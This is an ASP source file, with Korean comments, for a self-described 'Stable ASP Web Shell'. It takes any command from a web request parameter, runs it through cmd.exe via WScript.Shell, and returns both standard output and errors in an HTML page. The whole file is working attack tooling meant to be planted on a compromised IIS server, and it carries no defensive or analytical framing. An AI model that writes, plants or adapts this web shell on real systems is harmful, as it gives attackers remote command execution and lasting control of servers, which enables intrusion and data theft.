<%
    ' cmd.asp - Stable ASP Web Shell
    Dim oShell, oExec, sOutput, sCommand, sLine
    sCommand = Request("cmd")

    If sCommand <> "" Then
        Set oShell = Server.CreateObject("WScript.Shell")
        ' cmd.exe /c 를 사용하여 명령어를 직접 실행 (더 안정적)
        Set oExec = oShell.Exec("cmd /c " & sCommand)
        sOutput = ""

        ' 표준 출력을 스트림이 끝날 때까지 한 줄씩 읽기
        Do While Not oExec.StdOut.AtEndOfStream
            sLine = oExec.StdOut.ReadLine()
            sOutput = sOutput & sLine & vbCrLf
        Loop

        ' 표준 에러도 스트림이 끝날 때까지 한 줄씩 읽기
        Do While Not oExec.StdErr.AtEndOfStream
            sLine = oExec.StdErr.ReadLine()
            sOutput = sOutput & sLine & vbCrLf
        Loop
    End If
%>
<!DOCTYPE html>
<html>
<head>
    <title>ASP Web Shell (Stable)</title>
    <meta charset="utf-8">
</head>
<body>
    <h2>ASP Command Executor</h2>
    <form method="post">
        <input type="text" name="cmd" size="120" placeholder="whoami">
        <input type="submit" value="Execute">
    </form>
    <% If sCommand <> "" Then %>
    <h3>Result for: <%=Server.HTMLEncode(sCommand)%></h3>
    <pre><%=Server.HTMLEncode(sOutput)%></pre>
    <% End If %>
</body>
</html>
